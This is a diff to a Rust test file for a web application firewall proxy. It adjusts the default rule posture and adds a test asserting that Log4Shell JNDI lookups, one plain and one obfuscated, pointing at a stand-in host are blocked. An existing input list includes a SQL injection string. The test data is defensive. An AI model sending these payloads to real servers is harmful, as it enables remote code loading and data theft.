@@ -687,8 +687,8 @@ async fn the_origin_gets_our_forwarding_headers_not_the_clients() {
 }
 
 /// Ordinary text the 2026-10-07 review found blocked, under the posture a new
-/// site now gets: the CRS request families at PL2, the in-house files and the
-/// classifier on at 0.9 (the benchmarked posture). The coverage rules used to
+/// site now gets: the CRS request families at PL1, the in-house files, the
+/// default exclusions and the classifier on at 0.9 (the benchmarked posture). The coverage rules used to
 /// fire on these AND switch the classifier's veto off; anchored to code syntax
 /// they no longer fire, and the veto clears the weak CRS-only matches — once
 /// the site's own hostname (`test-site.local` scored 0.505) stopped deciding it.
@@ -785,6 +785,16 @@ async fn reported_false_positives_pass_under_the_default_posture() {
     });
     let (shutdown_tx, jh) = start_proxy(cfg).await;
 
+    let enc = |text: &str| -> String {
+        text.bytes()
+            .map(|b| match b {
+                b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'.' | b'_' => {
+                    (b as char).to_string()
+                }
+                _ => format!("%{b:02X}"),
+            })
+            .collect()
+    };
     let mut statuses = Vec::new();
     for text in [
         "I was charged twice; for some reason the refund never came",
@@ -797,15 +807,7 @@ async fn reported_false_positives_pass_under_the_default_posture() {
         "Hello,\necho, echo is anyone there?",
         "1' UNION SELECT password FROM users--",
     ] {
-        let q: String = text
-            .bytes()
-            .map(|b| match b {
-                b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'.' | b'_' => {
-                    (b as char).to_string()
-                }
-                _ => format!("%{b:02X}"),
-            })
-            .collect();
+        let q = enc(text);
         let (status, body) = send_request(
             listen_port,
             "test-site.local",
@@ -834,6 +836,24 @@ async fn reported_false_positives_pass_under_the_default_posture() {
     ] {
         let (status, _) = send_request(listen_port, "test-site.local", path, Method::GET, "").await;
         assert_eq!(status, StatusCode::OK, "real-traffic shape blocked: {path}");
+    }
+    // Log4Shell, plain and obfuscated (open-appsec's dataset). At PL1 it matches
+    // 932130 and 944150 for exactly the threshold, and the classifier, trained
+    // on no Java payload, scores it 0.49: its veto let these through until a
+    // Java-rule block could no longer be cleared by it.
+    for payload in [
+        "${jndi:ldap://x.example/a}",
+        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//x.example/a}",
+    ] {
+        let (status, _) = send_request(
+            listen_port,
+            "test-site.local",
+            &format!("/search?q={}", enc(payload)),
+            Method::GET,
+            "",
+        )
+        .await;
+        assert_eq!(status, StatusCode::FORBIDDEN, "Log4Shell passed: {payload}");
     }
     shutdown_proxy(shutdown_tx, jh).await;
 
